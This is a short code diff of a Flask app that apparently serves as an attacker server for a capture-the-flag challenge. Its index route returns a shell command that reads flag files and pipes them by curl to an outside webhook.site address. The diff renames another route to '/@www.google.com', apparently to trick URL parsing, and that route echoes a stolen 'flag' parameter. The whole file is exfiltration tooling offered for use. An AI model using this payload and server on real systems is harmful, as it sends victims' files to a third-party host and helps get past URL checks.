@@ -16,7 +16,7 @@ def validate_filename(filename: str):
 def get_index():
     return 'cat flag/*/* | curl -X POST --data-binary @- https://webhook.site/3ac78532-8d8b-4257-8593-3ee232134985', 200
 
-@app.route('/pwc', methods=['GET'])
+@app.route('/@www.google.com', methods=['GET'])
 def get_pwc():
     flag = request.args.get('flag')
     return 'flagnya: ' + flag
